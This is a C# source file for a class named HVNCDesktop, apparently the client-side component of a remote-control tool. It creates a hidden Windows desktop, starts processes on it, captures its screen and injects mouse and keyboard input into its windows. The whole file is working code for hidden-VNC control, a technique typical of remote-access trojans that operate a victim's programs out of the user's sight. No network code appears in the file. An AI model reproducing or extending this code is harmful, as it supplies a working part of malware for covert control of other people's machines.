using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteControl.Client.Utils
{
    /// <summary>
    /// 隐藏虚拟桌面管理 - 使用 Windows Desktop API
    /// </summary>
    public class HVNCDesktop : IDisposable
    {
        #region Win32 API

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags,
            bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int height);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
            int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

        [DllImport("gdi32.dll")]
        static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        static extern bool EnumDesktopWindows(IntPtr hDesktop,
            EnumDesktopWindowsDelegate lpfn, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        struct RECT
        {
            public int Left, Top, Right, Bottom;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize;
            public int dwXCountChars, dwYCountChars;
            public int dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public uint dwProcessId, dwThreadId;
        }

        const uint GENERIC_ALL = 0x10000000;
        const uint SRCCOPY = 0x00CC0020;
        const int SM_CXSCREEN = 0;
        const int SM_CYSCREEN = 1;

        // Mouse messages
        const uint WM_LBUTTONDOWN = 0x0201;
        const uint WM_LBUTTONUP = 0x0202;
        const uint WM_RBUTTONDOWN = 0x0204;
        const uint WM_RBUTTONUP = 0x0205;
        const uint WM_MOUSEMOVE = 0x0200;
        const uint WM_LBUTTONDBLCLK = 0x0203;
        const uint WM_RBUTTONDBLCLK = 0x0206;

        // Keyboard messages
        const uint WM_KEYDOWN = 0x0100;
        const uint WM_KEYUP = 0x0101;

        #endregion

        private IntPtr _hDesktop = IntPtr.Zero;
        private string _desktopName;
        private bool _disposed = false;

        public string DesktopName { get { return _desktopName; } }

        /// <summary>
        /// 创建隐藏桌面
        /// </summary>
        public bool Create(string name)
        {
            _desktopName = name;
            _hDesktop = CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
            return _hDesktop != IntPtr.Zero;
        }

        /// <summary>
        /// 在隐藏桌面上启动进程
        /// </summary>
        public bool StartProcess(string filePath, string arguments)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = _desktopName;
            PROCESS_INFORMATION pi;

            string cmdLine = string.IsNullOrEmpty(arguments)
                ? filePath
                : filePath + " " + arguments;

            return CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero,
                false, 0, IntPtr.Zero, null, ref si, out pi);
        }

        /// <summary>
        /// 截取隐藏桌面屏幕
        /// </summary>
        public Bitmap CaptureScreen()
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return null;

            try
            {
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);
                if (width == 0 || height == 0)
                {
                    width = 1920;
                    height = 1080;
                }

                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr memDC = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, width, height);
                IntPtr oldBitmap = SelectObject(memDC, hBitmap);

                BitBlt(memDC, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

                SelectObject(memDC, oldBitmap);
                Bitmap bmp = Image.FromHbitmap(hBitmap);

                DeleteObject(hBitmap);
                DeleteDC(memDC);
                ReleaseDC(IntPtr.Zero, hdc);

                return bmp;
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入鼠标事件
        /// </summary>
        public void InjectMouseEvent(int x, int y, int button, int operation)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                IntPtr hWnd = FindWindowAtPoint(x, y);
                if (hWnd == IntPtr.Zero) return;

                RECT rect;
                GetWindowRect(hWnd, out rect);
                int localX = x - rect.Left;
                int localY = y - rect.Top;
                IntPtr lParam = (IntPtr)((localY << 16) | (localX & 0xFFFF));

                uint msg = WM_MOUSEMOVE;
                switch (operation)
                {
                    case 0: // MouseDown
                        msg = (button == 1) ? WM_LBUTTONDOWN : WM_RBUTTONDOWN;
                        break;
                    case 1: // MouseUp
                        msg = (button == 1) ? WM_LBUTTONUP : WM_RBUTTONUP;
                        break;
                    case 2: // MouseMove
                        msg = WM_MOUSEMOVE;
                        break;
                    case 3: // DoubleClick
                        msg = (button == 1) ? WM_LBUTTONDBLCLK : WM_RBUTTONDBLCLK;
                        break;
                }

                PostMessage(hWnd, msg, IntPtr.Zero, lParam);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 向隐藏桌面注入键盘事件
        /// </summary>
        public void InjectKeyboardEvent(int keyCode, bool isKeyDown)
        {
            IntPtr originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (!SetThreadDesktop(_hDesktop))
                return;

            try
            {
                IntPtr hWnd = GetForegroundWindowOnDesktop();
                if (hWnd == IntPtr.Zero) return;

                uint msg = isKeyDown ? WM_KEYDOWN : WM_KEYUP;
                PostMessage(hWnd, msg, (IntPtr)keyCode, IntPtr.Zero);
            }
            finally
            {
                SetThreadDesktop(originalDesktop);
            }
        }

        /// <summary>
        /// 在隐藏桌面上找到指定点的窗口
        /// </summary>
        private IntPtr FindWindowAtPoint(int x, int y)
        {
            IntPtr found = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (!IsWindowVisible(hWnd)) return true;
                RECT rect;
                GetWindowRect(hWnd, out rect);
                if (x >= rect.Left && x <= rect.Right &&
                    y >= rect.Top && y <= rect.Bottom)
                {
                    found = hWnd;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        /// <summary>
        /// 获取隐藏桌面上的前台窗口(第一个可见窗口)
        /// </summary>
        private IntPtr GetForegroundWindowOnDesktop()
        {
            IntPtr found = IntPtr.Zero;
            EnumDesktopWindows(_hDesktop, (hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                {
                    found = hWnd;
                    return false;
                }
                return true;
            }, IntPtr.Zero);
            return found;
        }

        public void Dispose()
        {
            if (!_disposed && _hDesktop != IntPtr.Zero)
            {
                CloseDesktop(_hDesktop);
                _hDesktop = IntPtr.Zero;
                _disposed = true;
            }
        }
    }
}
